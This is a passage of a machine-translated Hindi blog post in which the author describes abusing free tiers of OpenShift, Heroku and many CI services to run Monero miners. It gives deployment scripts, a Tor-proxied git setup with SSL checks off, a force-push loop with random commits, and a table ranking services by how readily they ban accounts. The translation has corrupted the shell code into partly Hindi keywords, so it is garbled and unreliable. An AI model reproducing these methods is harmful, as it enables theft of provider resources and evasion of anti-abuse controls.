डोकर बिल्ड-टी<span class=hljs-variable > $आईएमजी</span>  . || <span class=hljs-built_in > बाहर जाएं</span> 1
<span class=hljs-built_in > सीडी</span>  -
ओसी-पुश-इमेज<span class=hljs-string >"<span class=hljs-variable > $आईएमजी</span>"</span></code></pre><p> यह खनन कंटेनर बनाने के लिए इस्तेमाल की जाने वाली स्क्रिप्ट थी जिसके लिए यमल टेम्पलेट की आवश्यकता होती है:</p><pre><code class="yaml hljs"><span class=hljs-attr >apiVersion:</span><span class=hljs-string >build.openshift.io/v1</span><span class=hljs-attr >kind:</span><span class=hljs-string >BuildConfig</span><span class=hljs-attr >metadata:</span><span class=hljs-attr >labels:</span><span class=hljs-attr >build:</span><span class=hljs-string >${OC_APP}</span><span class=hljs-attr >name:</span><span class=hljs-string >${OC_APP}</span><span class=hljs-attr >spec:</span><span class=hljs-attr >activeDeadlineSeconds:</span><span class=hljs-number >5184000</span><span class=hljs-attr >failedBuildsHistoryLimit:</span><span class=hljs-number >0</span><span class=hljs-attr >successfulBuildsHistoryLimit:</span><span class=hljs-number >0</span><span class=hljs-attr >resources:</span><span class=hljs-attr >limits:</span><span class=hljs-attr >cpu:</span><span class=hljs-number >2</span><span class=hljs-attr >memory:</span><span class=hljs-string >1Gi</span><span class=hljs-attr >runPolicy:</span><span class=hljs-string >Serial</span><span class=hljs-attr >source:</span><span class=hljs-attr >type:</span><span class=hljs-string >Binary</span><span class=hljs-attr >strategy:</span><span class=hljs-attr >sourceStrategy:</span><span class=hljs-attr >from:</span><span class=hljs-attr >kind:</span><span class=hljs-string >ImageStreamTag</span><span class=hljs-attr >name:</span><span class=hljs-string >${OC_APP}-build:latest</span><span class=hljs-attr >namespace:</span><span class=hljs-string >${OC_PRJ}</span><span class=hljs-attr >type:</span><span class=hljs-string >Source</span><span class=hljs-attr >template:</span><span class=hljs-attr >activeDeadlineSeconds:</span><span class=hljs-number >2400</span><span class=hljs-attr >triggers:</span><span class=hljs-bullet >-</span><span class=hljs-attr >generic:</span><span class=hljs-attr >secretReference:</span><span class=hljs-attr >name:</span><span class=hljs-string >${OC_APP}</span><span class=hljs-attr >type:</span><span class=hljs-string >Generic</span></code></pre><p> लेकिन पूरी प्रक्रिया में काफी कदम शामिल थे!</p><pre><code class="sh hljs"><span class=hljs-comment >## init</span>
[ -z <span class=hljs-string >"<span class=hljs-variable > $ओसी_एपीपी</span>"</span> ] &amp;&amp; <span class=hljs-built_in > निर्यात</span>  $(&lt;$(टीएफआई))
[-z<span class=hljs-string >"<span class=hljs-variable > $ओसी_एपीपी</span>"</span>  ] &amp;&amp; {. ./choose-creds ||<span class=hljs-built_in > बाहर जाएं</span> 1; }
oc-login
oc new-project <span class=hljs-variable > $ओसी_पीआरजे</span>  || { [-z<span class=hljs-string >"<span class=hljs-subst > $ (ओसी प्रोजेक्ट प्राप्त करें)</span>"</span> ] &amp;&amp; <span class=hljs-built_in > बाहर जाएं</span> 1; }
oc new-app <span class=hljs-variable > $ओसी_एपीपी</span>  --अनुमति-अनुमति-छवियां ||<span class=hljs-built_in > बाहर जाएं</span> 1

<span class=hljs-comment > ## डॉकटर और पुश के साथ बॉक्स बनाएं</span><span class=hljs-comment > # oc-docker-login || बाहर निकलें 1</span> 
ओसी-बिल्ड-माइन ||<span class=hljs-built_in > बाहर जाएं</span> 1

<span class=hljs-comment > ## डीसी कॉन्फ़िगरेशन बनाएं</span><span class=hljs-built_in > निर्यात</span>  OC_TEMPLATE_TYPE=मेरा
ओसी-बॉक्स-टेम्पलेट ||<span class=hljs-built_in > बाहर जाएं</span> 1
rtr=0
<span class=hljs-keyword > जबकि</span> [ <span class=hljs-variable >$rtr</span>  -एलटी 10];<span class=hljs-keyword > करना</span> 
  ओसी रोलआउट नवीनतम<span class=hljs-variable > $ओसी_एपीपी</span> &amp;&amp; <span class=hljs-built_in > टूटना</span> 
  आरटीआर=$((आरटीआर+ .)<span class=hljs-number >1</span>))
  <span class=hljs-built_in > पढ़ना</span>  -टी 1
<span class=hljs-keyword > किया हुआ</span><span class=hljs-built_in > बाहर जाएं</span><span class=hljs-comment > ## बनाता है</span> 
बैश-एक्स ओसी-बिल्ड-बिल्ड ||<span class=hljs-built_in > बाहर जाएं</span> 1
bash -x oc-build-template || <span class=hljs-built_in > बाहर जाएं</span> 1
oc start-build <span class=hljs-variable > $ओसी_एपीपी</span> || <span class=hljs-built_in > बाहर जाएं</span> 1

accounts=<span class=hljs-variable > ${ACCOUNTS_DIR:-accounts_queue}</span> 
एमवी<span class=hljs-variable > $खाते</span>/<span class=hljs-variable > ${OC_USR}</span> {\.यह,\.$(दिनांक +%s)}</code></pre><p> छद्म कोड में:</p><ul><li><p> प्रोजेक्ट बनाएं</p><li><p> छवि के बिना एप्लिकेशन बनाएं</p><li><p> खनन कंटेनर का निर्माण</p><li><p> परिनियोजन कॉन्फ़िगरेशन के साथ कंटेनर को परिनियोजित करें (कुबेरनेट्स एब्स्ट्रैक्शन)</p><li><p> तैनाती को रोलआउट करें</p></ul><p> NS<code>build-build</code> इसके बजाय स्क्रिप्ट बनाई गई<em> निर्माण</em> कंटेनर जो एक बार में कुछ घंटों के लिए मेरा होगा। बिल्ड और सामान्य पॉड्स के ओपनशिफ्ट में अलग-अलग संसाधन होते हैं इसलिए हमने उन दोनों का शोषण किया। ओपेनशिफ्ट कुल मिलाकर एक बुरा अनुभव था क्योंकि यह 4 अलग-अलग रिलीज़ से अधिक हो गया था (शायद अधिक, मैंने थोड़ी देर बाद ट्रैकिंग बंद कर दी) और उनमें से प्रत्येक को कॉन्फ़िगरेशन में बदलाव की आवश्यकता थी, उनके पास कोई अपग्रेड पथ नहीं था और सब कुछ जल्दी से खत्म हो गया था, और यह सामान्य था स्टाल करने के लिए बिल्ड/पॉड्स के लिए, और कचरा इकट्ठा नहीं किया जा रहा है ... वे आम तौर पर थोड़ी देर में मैन्युअल पुनरारंभ करते हैं, शायद कुबेरनेट्स सिर्फ छोटी गाड़ी थी :)</p><p> हेरोकू कॉन्फ़िगरेशन थोड़ा आसान था (इसमें कुबेरनेट्स शामिल नहीं है)। कंटेनर बिल्ड के अलावा, जो ओपनशिफ्ट के समान था, बाकी सिर्फ दो क्ली कमांड थे</p><pre><code class="bash hljs">heroku config:<span class=hljs-built_in >set</span> HRK_APP=<span class=hljs-variable >$HRK_APP</span> -a <span class=hljs-variable >$HRK_APP</span>
heroku container:release -a <span class=hljs-variable >$HRK_APP</span><span class=hljs-variable >$TYPE</span></code></pre><p> कंटेनर को सीधे डॉकटर के साथ उसकेोकू रजिस्ट्री पर धकेल दिया गया था।<sup id="fnref:herokucontainers"><a class=fnref href="#fndef:herokucontainers">[12]</a></sup> हेरोकू के साथ घर्षण (जो मुक्त स्तर अभी भी लेखन के समय तक खड़ा है) यह है कि डायनोस प्रति माह केवल 22 दिनों तक चल सकता है, इसलिए उन्हें हर महीने कुछ मैन्युअल प्रबंधन की आवश्यकता होती है, फिर से घबराहट और उबाऊ। उन्होंने शुरुआत में कुछ प्रतिबंध लहरों को अंजाम दिया, और फिर उन्होंने टीओआर के माध्यम से पंजीकरण अक्षम कर दिया, मुझे पूरा यकीन है कि मैं इसका कारण था।</p><h3 id=ci_containers_or_vms ><a class=header-anchor href="#ci_containers_or_vms"> सीआई कंटेनर या वीएम</a></h3><p>ये हमारे ड्रॉपर के लिए सबसे सहक्रियात्मक लक्ष्य थे। वहां कई हैं<a href="https://en.wikipedia.org/wiki/Continuous_integration"> सीआई</a> कंपनियां, जिनमें से कई तकनीकी बुनियादी ढांचे के कारोबार में कुछ बाजार हिस्सेदारी इकट्ठा करने की उम्मीद में निवेशकों के पैसे को मुफ्त स्तर की पेशकश कर रही हैं।</p><p> ये सभी सेवाएं अलग-अलग संसाधन प्रदान करती हैं, अलग-अलग कॉन्फ़िगरेशन आवश्यकताएं होती हैं और विभिन्न वातावरणों में चलती हैं। मैंने कभी भी खाता पंजीकरण को स्वचालित करने पर विचार नहीं किया क्योंकि इस तरह की चीजें कार्यक्रम के लिए भयानक हैं, मैं हर समय उनसे बचने की कोशिश करता हूं, इसलिए मैंने कुछ समय के लिए मैन्युअल पंजीकरण को सहन किया क्योंकि मैं उत्सुक था कि मुझे किस प्रकार की स्पैम विरोधी प्रतिक्रिया मिलेगी (और बाकी से कितना अलग!) आप किसी कंपनी के प्रबंधन के बारे में कुछ बातों का अनुमान लगा सकते हैं कि वह स्पैम को कैसे संभालती है:</p><ul><li><p> क्या यह प्रतिबंध तरंगों का प्रदर्शन करता है? फिर उनके पास गैर सख्त नीतियां हैं, समस्याओं को मैन्युअल रूप से और मामले के अनुसार नियंत्रित किया जाता है</p><li><p> क्या इसके लिए फ़ोन सत्यापन की आवश्यकता है? उनके साथ पहले भी दुर्व्यवहार किया जा चुका है</p><li><p> क्या वे भारी संसाधन उपयोग का जवाब देते हैं? वे एक कड़े बजट पर चल रहे हैं</p><li><p> क्या वे खाता प्रतिबंध या छाया प्रतिबंध लागू करते हैं? यदि वे छाया प्रतिबंध लगाते हैं, तो उनका मतलब sysadmins है।</p></ul><p> एक दार्शनिक प्रश्न भी है: यदि कोई सेवा आपको लंबे समय तक उनके सिस्टम का दुरुपयोग करने की अनुमति देती है, तो क्या इसका मतलब यह है कि उनके पास लोड को संभालने में सक्षम एक शीर्ष-शेल्फ बुनियादी ढांचा है, या बस उनके सिस्टम पर खराब नियंत्रण है? और आपको पहुंच और सुरक्षा के बीच संतुलन पर विचार करना चाहिए, एक प्रणाली बहुत सुरक्षित है जो उपयोगकर्ता प्रतिधारण को कम कर सकती है।</p><p> यहां कुछ सेवाओं को दिखाने वाली एक तालिका है, जिन पर मैंने तैनात किया है:</p><table><tr class="header headerLastRow"><th style="text-align: center;"> सीआई<th style="text-align: center;"> विन्यास<th style="text-align: center;"> प्रदर्शन<th style="text-align: center;"> प्रतिबंध हथौड़ा<tr><td style="text-align: center;"> बिट्रिज़<td style="color: red; text-align: center;"> खराब<td style="color: yellow; text-align: center;"> मध्यम<td style="color: yellow; text-align: center;"> मध्यम<tr><td style="text-align: center;"> ट्रैविस<td style="color: green; text-align: center;"> अच्छा<td style="color: yellow; text-align: center;"> मध्यम<td style="color: green; text-align: center;"> अच्छा<tr><td style="text-align: center;"> कोडशिप<td style="color: yellow; text-align: center;"> मध्यम<td style="color: red; text-align: center;"> खराब<td style="color: yellow; text-align: center;"> मध्यम<tr><td style="text-align: center;"> गिटलाब<td style="color: yellow; text-align: center;"> मध्यम<td style="color: green; text-align: center;"> अच्छा<td style="color: green; text-align: center;"> अच्छा<tr><td style="text-align: center;">सर्किलसी<td style="color: red; text-align: center;"> खराब<td style="color: green; text-align: center;"> अच्छा<td style="color: yellow; text-align: center;"> मध्यम<tr><td style="text-align: center;"> सिकंदरा<td style="color: green; text-align: center;"> अच्छा<td style="color: green; text-align: center;"> अच्छा<td style="color: yellow; text-align: center;"> मध्यम<tr><td style="text-align: center;"> डाक में काम करनेवाला मज़दूर<td style="color: yellow; text-align: center;"> मध्यम<td style="color: yellow; text-align: center;"> मध्यम<td style="color: green; text-align: center;"> अच्छा<tr><td style="text-align: center;"> घाट<td style="color: green; text-align: center;"> अच्छा<td style="color: yellow; text-align: center;"> मध्यम<td style="color: yellow; text-align: center;"> मध्यम<tr><td style="text-align: center;"> कोडफ्रेश<td style="color: red; text-align: center;"> खराब<td style="color: green; text-align: center;"> अच्छा<td style="color: yellow; text-align: center;"> मध्यम<tr><td style="text-align: center;"> वर्कर<td style="color: yellow; text-align: center;"> मध्यम<td style="color: yellow; text-align: center;"> मध्यम<td style="color: red; text-align: center;"> खराब<tr><td style="text-align: center;"> नीला-पाइपलाइन<td style="color: yellow; text-align: center;"> मध्यम<td style="color: yellow; text-align: center;"> मध्यम<td style="color: red; text-align: center;"> खराब<tr><td style="text-align: center;"> सतत पीएचपी<td style="color: red; text-align: center;"> खराब<td style="color: yellow; text-align: center;"> मध्यम<td style="color: yellow; text-align: center;"> मध्यम<tr><td style="text-align: center;"> साथी<td style="color: red; text-align: center;"> खराब<td style="color: red; text-align: center;"> खराब<td style="color: red; text-align: center;"> खराब<tr><td style="text-align: center;"> मुफ़्तक़ोर<td style="color: red; text-align: center;"> खराब<td style="color: green; text-align: center;"> अच्छा<td style="color: red; text-align: center;"> खराब<tr><td style="text-align: center;"> ऐप्वेयर<td style="color: red; text-align: center;"> खराब<td style="color: yellow; text-align: center;"> मध्यम<td style="color: red; text-align: center;"> खराब<tr><td style="text-align: center;"> नेवरकोड<td style="color: red; text-align: center;"> खराब<td style="color: green; text-align: center;"> अच्छा<td style="color: yellow; text-align: center;"> मध्यम<tr><td style="text-align: center;"> ज़ीस्ट/वर्सेल<td style="color: red; text-align: center;"> खराब<td style="color: green; text-align: center;"> अच्छा<td style="color: red; text-align: center;"> खराब</table><p> इस संदर्भ में, ए<span style="color: green"> अच्छा</span> कॉन्फ़िगरेशन का अर्थ है कि इसे कॉन्फ़िगर करने में अधिक समय नहीं लगा<code>ci</code> खनन प्रक्रिया के लिए नौकरी (जैसे कि एक रिपॉजिटरी डॉट-फाइल के बजाय वेब डैशबोर्ड पर निर्भर सभी सेवाएं एक घर का काम थीं), ए<span style="color: red"> खराब</span><code>ban-hammer</code> इसका मतलब है कि सेवा में पंजीकरण करना कठिन था, या यह कि खाते अधिक आक्रामक रूप से प्रतिबंधित हो जाएंगे।</p><p><a href="https://web.archive.org/web/20210222050951/https://www.bitrise.io/"> बिट्रिज़</a> एक परियोजना को स्थापित करने की आवश्यकता है, पर्यावरण, लक्ष्य वास्तुकला, निष्पादन प्रक्रिया और अन्य चीजों का अनुमान लगाने के लिए, एक बिल्ड को स्थापित करने में बहुत समय लगता था इसलिए इसे कॉन्फ़िगरेशन में खराब रेटिंग मिली।<a href="https://web.archive.org/web/20210310010750/https://continuousphp.com/"> सतत पीएचपी</a>, <a href="https://web.archive.org/web/20210322133805/https://buddy.works/"> साथी</a> , [कोडफ्रेश] में बहुत सारे मैनुअल गैर-घोषणात्मक कॉन्फ़िगरेशन चरण भी थे।</p><p> [Azure-पाइपलाइन] जैसी सेवाएं,<a href="https://web.archive.org/web/20210308202144/https://app.wercker.com/"> वर्कर</a>, <a href="https://web.archive.org/web/20210322133805/https://buddy.works/"> साथी</a> खातों पर छाया-प्रतिबंध लागू करता है, छाया-प्रतिबंध खराब हैं, क्योंकि वे आपको अनुमान लगाते हैं कि आपके कॉन्फ़िगरेशन में कुछ गड़बड़ है या नहीं। कुछ सेवाओं के साथ आप प्रतिबंध के कारण का अनुमान लगा सकते हैं (आपके निर्माण में बहुत अधिक समय लगा, या आपने बहुत कम समय में कई बार निर्माण किया), कुछ अन्य लोगों के लिए जैसे [Azure-pipelines] मुझे लगता है कि उन्होंने किसी प्रकार का फिंगरप्रिंट लागू किया है उपयोगकर्ता भंडारों के लिए संसाधनों के दुरुपयोग के बिना भी प्रतिबंध आ रहे थे, नीला और वर्सेल भी प्रतिबंधित थे<code>DNS</code> सार्वजनिक निर्माण मशीनों के भीतर पहुंच, ताकि अतिरिक्त घर्षण था जिसे तदर्थ सुरंग से दूर करने की आवश्यकता थी।</p><p><a href="https://web.archive.org/web/20210327045555/https://cloud.drone.io/welcome"> मुफ़्तक़ोर</a> पूरे 16+ कोर प्रोसेसर तक पहुंच प्रदान की लेकिन 2 बिल्ड के बाद प्रतिबंध लगा दिया<sup id="fnref:saddrone"><a class=fnref href="#fndef:saddrone">[13]</a></sup>. <a href="https://web.archive.org/web/20210322100629/https://www.cloudbees.com/products/codeship"> कोडशिप</a> शक्तिशाली बिल्ड मेजबानों तक भी पहुंच प्रदान करता है और ड्रोन के रूप में आक्रामक रूप से प्रतिबंध नहीं लगाता है।</p><p>मेरी पसंदीदा सेवाएं लाभप्रदता के कारण नहीं बल्कि आसानी और सुविधा के लिए (अन्य परियोजनाओं के साथ भी) थीं<a href="https://web.archive.org/web/20210324163536/https://travis-ci.org/"> ट्रैविस</a>, <a href="https://web.archive.org/web/20210308041527/https://semaphoreci.com/"> सिकंदरा</a> तथा<a href="https://web.archive.org/web/20210322105637/https://hub.docker.com/"> डॉकर-हब</a> . ट्रैविस मानक सीआई की तरह है और बहुत लचीला है, केवल सेमाफोर है<code>DSL</code> के लिये<code>CI</code> यह अन्य UI की तरह स्पेगेटीफाइड चेक-बॉक्स के अंतहीन अनुक्रम के बजाय स्वीकार्य और अच्छी तरह से दिखता था, और डॉकर को बनाने के लिए डॉकफाइल को मैप करने की सादगी के लिए।</p><h3 id=builds_configs ><a class=header-anchor href="#builds_configs"> विन्यास बनाता है</a></h3><p> वेब सेवाओं द्वारा या गिट कमिट्स द्वारा दी जाने वाली क्रॉन जॉब्स द्वारा बिल्ड को ट्रिगर किया गया था। इसलिए आपको सभी गिट कमिट्स को प्रबंधित करने के लिए एक्सेस टोकन या ssh कीज़ के कूड़ेदान पर नज़र रखनी होगी। यह भी महत्वपूर्ण था कि अति-स्पैम कमिट न करें, और git को कॉन्फ़िगर करने वाले रिपॉजिटरी पर धकेलते समय प्रॉक्सी का उपयोग करें:</p><pre><code class="toml hljs"><span class=hljs-section >[http]</span><span class=hljs-attr >proxy</span> = socks5://<span class=hljs-number >127.0</span>.<span class=hljs-number >0.1</span>:<span class=hljs-number >9050</span><span class=hljs-attr >sslverify</span> = <span class=hljs-literal >false</span><span class=hljs-section >[https]</span><span class=hljs-attr >proxy</span> = socks5://<span class=hljs-number >127.0</span>.<span class=hljs-number >0.1</span>:<span class=hljs-number >9050</span><span class=hljs-attr >sslverify</span> = <span class=hljs-literal >false</span><span class=hljs-section >[url "https://"]</span><span class=hljs-attr >insteadOf</span> = git://</code></pre><p> गिट होस्टिंग सेवाओं का उपयोग करते हुए, जीथब प्रतिबंधों के बारे में एक और गहन रहा है, लेकिन उन्हें केवल सीआई सेवाओं के व्यवस्थापक द्वारा दुर्व्यवहार की रिपोर्ट पर निष्पादित किया गया था, जब मैंने सीआई परीक्षण (लापरवाही से) को नवीनीकृत करने का प्रयास किया, तो गिटलैब ने एक बार प्रतिबंध लहर को निष्पादित किया। मुझे कभी भी बिटबकेट खाते के लिए प्रतिबंध नहीं मिला है। (बल) पुश git कमिट करता है, हमारे पास एक लंबा चलने वाला लूप है जो git रिपॉजिटरी को फिर से टैग करता है:</p><pre><code class="bash hljs"><span class=hljs-keyword >while</span> :; <span class=hljs-keyword >do</span>
    repos_count=$(ls -ld <span class=hljs-variable >${repos}</span>/* | grep -c ^d)
    repos_ival=$(((RANDOM%variance+delay)/repos_count))
    <span class=hljs-keyword >for</span> r <span class=hljs-keyword >in</span><span class=hljs-variable >$repos</span>/*; <span class=hljs-keyword >do</span><span class=hljs-built_in >cd</span><span class=hljs-string >"<span class=hljs-variable > $r</span>"</span> 
        गिट फ़ेच --all
        टैगर
        <span class=hljs-built_in > गूंज</span>  -इ<span class=hljs-string >"\e[32m"</span><span class=hljs-string >"sleeping for <span class=hljs-variable > $repos_val</span>  जबसे<span class=hljs-subst > $(दिनांक +%एच:%एम:%एस\%बी/%डी)</span>"</span><span class=hljs-string >"\e[0m"</span> 
        नींद<span class=hljs-variable > $repos_val</span><span class=hljs-keyword > किया हुआ</span> 
    नींद १<span class=hljs-keyword > किया हुआ</span></code></pre><p>यह संभव हो सकता है कि इस तरह से धक्का देने वाला बल कुछ ऐसा नहीं है जिसे जीथब बहुत पसंद करता है और खातों को फ़्लैग करने का एक कारण हो सकता है। टैगर फ़ंक्शन एक अलग कमिट को धक्का देने के साथ काम करता है, एक वेबसाइट का उपयोग करता है (जिसे आप काफी आसानी से देख सकते हैं) जो कुछ यादृच्छिक कमिट देता है। मुझे यकीन नहीं है कि इससे कितनी मदद मिलती है, क्योंकि कमिट की सामग्री ही मेरे मामले के लिए स्पष्ट रूप से संदिग्ध है। और यह मुझे एक बार गधे में भी काटता है, क्योंकि इस कमांड द्वारा लौटाए गए कमिट में शपथ शब्द शामिल हो सकते हैं, मेरे एक कमिट को एक ट्विटर बॉट द्वारा उठाया गया था जो कि कसम शब्दों के साथ गिट कमिट को ट्रैक करता है! मैंने घटना के बाद बुरे शब्दों के लिए एक ब्लैकलिस्ट जोड़ा।</p><p> मैंने वास्तव में अस्पष्ट गिट कामों और अस्पष्ट गिट भंडारों में नहीं पहुंचा है। एकमात्र उदाहरण जहां मैं एक अधिक विस्तृत भंडार का उपयोग कर रहा था, बिट्रिस के साथ था क्योंकि यदि आप सिस्टम को पर्यावरण (जैसे मोबाइल ऐप्स) नहीं पहचानते हैं तो आप एक बिल्ड स्थापित नहीं कर सकते हैं, लेकिन तब भी कोई रोटेशन नहीं था और यह हमेशा वही था भंडार, स्पॉट करने में काफी आसान है।</p><p> कुल मिलाकर, अगर मुझे मेरे लिए इष्टतम समय के आसपास एक घंटी वक्र प्लॉट करना था<em> के बग़ैर</em>सभी परीक्षण सेवाओं में खातों को प्रतिबंधित करना, प्रति दिन एक बार लगभग 1 घंटे की निर्माण अवधि के केंद्र के साथ होगा। सीपीयू कोर के लिए, कुछ आउट-लियर्स (जैसे ड्रोन) के अलावा, अधिकांश सेवाओं की अपेक्षा है कि आप दिए गए संसाधनों की पूरी मात्रा का उपयोग करें क्योंकि बिल्ड वीएम या कंटेनरों के अंदर सीमित संसाधनों के साथ चलाए जाते हैं ... और संकलन आमतौर पर एक ऐसा कार्य है जो सीपीयू को संतृप्त करता है, इसलिए इसकी सांख्यिकीय प्रासंगिकता नहीं है। सहज रूप से प्रति दिन एक बिल्ड वही होता है जो औसत डेवलपर करता है, इसलिए यदि आप माध्य से दूर भटकते हैं, तो आपको उठाए गए झंडे की अपेक्षा करनी चाहिए, और दुरुपयोग के लिए जोर देना कभी भी समाप्त नहीं होता है।</p><h2 id=conclusions ><a class=header-anchor href="#conclusions"> निष्कर्ष</a></h2><p> क्या यह इसके लायक था? नेटवर्किंग भाग निश्चित रूप से दिलचस्प थे, खातों के पंजीकरण से निपटना स्पष्ट रूप से सबसे खराब हिस्सा था, कोई भी व्यक्ति अंतहीन पुष्टिकरण ईमेल पर क्लिक करना पसंद नहीं करता है और मन को सुन्न करने वाली UI प्रक्रियाओं को दोहराता है। स्पैम ऑटोमेशन सॉफ्टवेयर लिखना भी उबाऊ है (क्योंकि आप ज्यादातर गूंगा एपीआई पर प्रहार करते हैं), और इस धारणा के साथ (और यह तथ्य कि यह कभी भी गंभीर नहीं था) मैंने कभी इस पर विचार भी नहीं किया। क्या यह लाभदायक था? अपने चरम पर यह कुछ इस तरह पहुँच रहा था<code>300$</code> प्रति माह, शायद एक वेनेजुएला के लिए पर्याप्त, वास्तव में मेरे लिए नहीं :)</p><p></p><table class=fndef id="fndef:adversary"><tr><td class=fndef-backref ><a href="#fnref:adversary">[1]</a><td class=fndef-content ><em> क्रोधी sysadmin</em></table><table class=fndef id="fndef:infoproc"><tr><td class=fndef-backref ><a href="#fnref:infoproc">[2]</a><td class=fndef-content > भले ही यह कई गोपनीयता मान्यताओं को तोड़ देगा, मुझे यकीन है कि जब भी कोई समस्या होती है तो उनमें से अधिकतर अंदर झांकते हैं, लेकिन यह केवल कंटेनर आधारित रनटाइम के लिए एक समस्या है, जबकि वीएम बहुत अधिक ब्लैक बॉक्स हैं।</table><table class=fndef id="fndef:monerominer"><tr><td class=fndef-backref ><a href="#fnref:monerominer">[3]</a><td class=fndef-content > मोनरो नोड में निर्मित माइनर को इसे और अधिक पृष्ठभूमि के अनुकूल बनाने के लिए कुछ काम मिला, लेकिन xmrig का वितरण कभी भी पृष्ठभूमि मित्रता पर केंद्रित नहीं था।</table><table class=fndef id="fndef:difficulty"><tr><td class=fndef-backref ><a href="#fnref:difficulty">[5]</a><td class=fndef-content >कुछ पूल विभिन्न कनेक्शन बंदरगाहों पर अलग-अलग कठिनाइयों की पेशकश करते हैं, और काम की कठिनाई को खनिक द्वारा जमा किए गए शेयरों में संरेखित करते हैं, लेकिन प्रॉक्सी की ग्रैन्युलैरिटी अभी भी अधिक सुविधाजनक थी, क्योंकि यह पूल को रोक देगा<a href="https://en.wikipedia.org/wiki/Vendor_lock-in"> बंद करना</a> (हालाँकि हमने वास्तव में कभी भी पूल को स्विच नहीं किया है)।</table><table class=fndef id="fndef:configwatch"><tr><td class=fndef-backref ><a href="#fnref:configwatch">[4]</a><td class=fndef-content > यह खुश नहीं था जब कॉन्फ़िगरेशन अचानक प्रकट हुआ और फ़ाइल सिस्टम से गायब हो गया</table><table class=fndef id="fndef:stratumprotocol"><tr><td class=fndef-backref ><a href="#fnref:stratumprotocol">[6]</a><td class=fndef-content > हम के बारे में बात नहीं करते हैं<a href="https://en.bitcoin.it/wiki/Stratum_mining_protocol"> स्ट्रैटम प्रोटोकॉल</a> चूंकि हमें बस जो कुछ भी लागू किया गया है उससे निपटना है<em> दोनों</em> पूल और माइनर ... जो आमतौर पर न्यूनतम है, और संभवतः गैर मानक एक्सटेंशन के साथ।</table><table class=fndef id="fndef:fullbash"><tr><td class=fndef-backref ><a href="#fnref:fullbash">[7]</a><td class=fndef-content > पूर्ण बैश कभी मत जाओ :)</table><table class=fndef id="fndef:memoryondemand"><tr><td class=fndef-backref ><a href="#fnref:memoryondemand">[8]</a><td class=fndef-content > मैंने यह पता नहीं लगाया है कि क्या होता है जब कोई प्रक्रिया रनटाइम पर अतिरिक्त कार्यक्षमता लोड करती है, क्योंकि कर्नेल निष्पादन योग्य के मेमोरी लेआउट में पते की तलाश करेगा, जो फाइल सिस्टम तक पहुंच जाएगा और संभावित रूप से क्रैश का कारण बन जाएगा।</table><table class=fndef id="fndef:freehostinglimits"><tr><td class=fndef-backref ><a href="#fnref:freehostinglimits">[9]</a><td class=fndef-content > सीमाएँ मनमानी हैं, सीपीयू समय एक सेकंड से भी कम है, मेमोरी 128M से कम है, आउटबाउंड कनेक्शन अवरुद्ध हैं।</table><table class=fndef id="fndef:cpanelssh"><tr><td class=fndef-backref ><a href="#fnref:cpanelssh">[10]</a><td class=fndef-content > थोड़े से धैर्य के साथ आप अपने cpanel खाता स्थान के आसपास बूटस्ट्रैप्ड वातावरण पर एक पूर्ण ssh इंस्टेंस भी चला सकते हैं,<em> के बग़ैर</em> सीपीएनल बिलिन एसएसएच तक पहुंच है जो होस्टिंग प्रदाताओं द्वारा अक्षम हो जाती है।</table><table class=fndef id="fndef:openshift"><tr><td class=fndef-backref ><a href="#fnref:openshift">[11]</a><td class=fndef-content > ओपनशिफ्ट 1 साल के फ्री टियर से 3 महीने से 1 महीने तक चला गया, फोन प्रमाणीकरण की आवश्यकता के लिए, मैं गारंटी दे सकता हूं कि मैं उनकी सेवाओं का दुरुपयोग करने वाला अकेला नहीं था।</table><table class=fndef id="fndef:herokucontainers"><tr><td class=fndef-backref ><a href="#fnref:herokucontainers">[12]</a><td class=fndef-content > हेरोकू फ्री टियर कंटेनर संसाधनों में काफी उदार हैं, वे 4c/8t (वर्चुअल) सीपीयू, भरपूर रैम और बड़े स्टोरेज प्रदान करते हैं (जो कि लगातार नहीं है और डायनो शटडाउन पर त्याग दिया गया है)।</table><table class=fndef id="fndef:saddrone"><tr><td class=fndef-backref ><a href="#fnref:saddrone">[13]</a><td class=fndef-content >वे बहुत सख्त पंजीकरण नियम जोड़ते हैं, कुछ प्रतिबंधों के बाद, मैंने इसमें योगदान दिया होगा।</table><p></p><div id=post-tags-list > पोस्ट टैग: <span class=post-tag ><a href="/hi/posts/tag/crypto" style=""> क्रिप्टो</a>, </span><span class=post-tag ><a href="/hi/posts/tag/net" style=""> जाल</a>, </span><span class=post-tag ><a href="/hi/posts/tag/shell" style=""> सीप</a></span></div><div class=page-foot ><div class=copyright > 21 अगस्त 2021 </div><script async="" crossorigin=anonymous issue-term=pathname label=Comment repo="untoreh/untoreh.github.io" src="https://utteranc.es/client.js"></script></div></div><div class=page__footer ><footer><div class=page__footer-copyright > © untoreh - द्वारा संचालित<a href="https://github.com/tlienart/Franklin.jl"> फ्रेंकलिन</a></div><div class=page__footer-links > - <ul><li><a href="/hi/sitemap.xml"> साइट मैप</a> | <li><a href="/hi/tag"> टैग</a> | <li><a href="/hi/feed.xml"> आरएसएस</a></ul></div><ul class=author__wrap ><li class="author__urls social-icons"><a href="https://twitter.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden=true class="fab fa-fw fa-twitter-square"></i></a><li class="author__urls social-icons"><a href="https://github.com/untoreh" rel="nofollow noopener noreferrer"><i aria-hidden=true class="fab fa-fw fa-github"></i></a><li class="author__urls social-icons"><a href="mailto:contact@unto.re"><i class="fas fa-envelope"></i></a><li><script type="application/ld+json">{"potentialAction":{"query-input":"required maxlength=100 name=query","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":"https://unto.re/search?&q={query}"}}</script></ul></footer></div><script crossorigin=anonymous defer="" id=fa integrity="sha384-DJ25uNYET2XCl5ZF++U8eNxPWqcKohUUBUpKGlNLMchM7q4Wjg2CUpjHLaL8yYPH" src="https://use.fontawesome.com/releases/v5.8.2/js/all.js"></script><script src="/libs/colors.js"></script><script src="/libs/menu.js"></script><script defer="" src="/libs/lunr/lunr.min.js"></script></HTML>